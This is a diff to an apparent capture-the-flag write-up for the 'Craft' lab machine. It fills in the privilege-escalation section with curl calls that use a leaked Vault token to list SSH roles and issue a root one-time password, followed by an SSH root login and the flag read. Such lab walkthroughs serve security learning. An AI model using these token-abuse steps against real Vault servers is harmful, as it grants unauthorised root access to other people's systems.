@@ -390,10 +390,72 @@ f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
 
 ### Exploitation
 
-Step-by-step privilege escalation.
-
 ```shell
-# Commands used
+kali㉿kali)-[~/machines/craft]
+└─$ curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb/v1/sys/auth
+{"token/":{"accessor":"auth_token_a38d00ba","config":{"default_lease_ttl":0,"max_lease_ttl":0,"plugin_name":""},"description":"token based credentials","local":false,"options":null,"seal_wrap":false,"type":"token"},"userpass/":{"accessor":"auth_userpass_4580aeca","config":{"default_lease_ttl":0,"listing_visibility":"unauth","max_lease_ttl":0,"plugin_name":""},"description":"","local":false,"options":{},"seal_wrap":false,"type":"userpass"},"request_id":"9e1ce8f5-ea15-5292-c878-45c9cc22cfc8","lease_id":"","renewable":false,"lease_duration":0,"data":{"token/":{"accessor":"auth_token_a38d00ba","config":{"default_lease_ttl":0,"max_lease_ttl":0,"plugin_name":""},"description":"token based credentials","local":false,"options":null,"seal_wrap":false,"type":"token"},"userpass/":{"accessor":"auth_userpass_4580aeca","config":{"default_lease_ttl":0,"listing_visibility":"unauth","max_lease_ttl":0,"plugin_name":""},"description":"","local":false,"options":{},"seal_wrap":false,"type":"userpass"}},"wrap_info":null,"warnings":null,"auth":null}
+
+```
+
+```
+ curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb/v1/ssh/roles?list=true
+{"request_id":"fc144309-0766-8faa-8023-00994f291478","lease_id":"","renewable":false,"lease_duration":0,"data":{"key_info":{"root_otp":{"key_type":"otp"}},"keys":["root_otp"]},"wrap_info":null,"warnings":null,"auth":null}
+
+```
+
+```
+curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb/v1/ssh/roles/root_otp
+{"request_id":"a4fb4d91-d90f-2e9c-92db-a853a69891f4","lease_id":"","renewable":false,"lease_duration":0,"data":{"allowed_users":"","cidr_list":"0.0.0.0/0","default_user":"root","exclude_cidr_list":"","key_type":"otp","port":22},"wrap_info":null,"warnings":null,"auth":null}
+
+```
+
+```
+curl -sk -X POST -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" \
+  -d '{"ip":"10.129.162.165","username":"root"}' \
+  https://vault.craft.htb/v1/ssh/creds/root_otp 
+{"request_id":"a1714226-66ba-defd-3aef-ef356dbf2d54","lease_id":"ssh/creds/root_otp/69d24018-f9a9-11aa-99dd-623ed152a4bc","renewable":false,"lease_duration":2764800,"data":{"ip":"10.129.162.165","key":"1a7cdc6d-677f-f676-f37a-a7f4e27997ce","key_type":"otp","port":22,"username":"root"},"wrap_info":null,"warnings":null,"auth":null}
+
+```
+
+```
+ssh root@craft.htb         
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+(root@craft.htb) Password: 1a7cdc6d-677f-f676-f37a-a7f4e27997ce
+Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov 16 07:14:50 2023
+root@craft:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@craft:~# cat /root/root.txt
+ecb211a09bb65535ebf7d52e066ed386
+root@craft:~# 
+
 ```
 
 ---
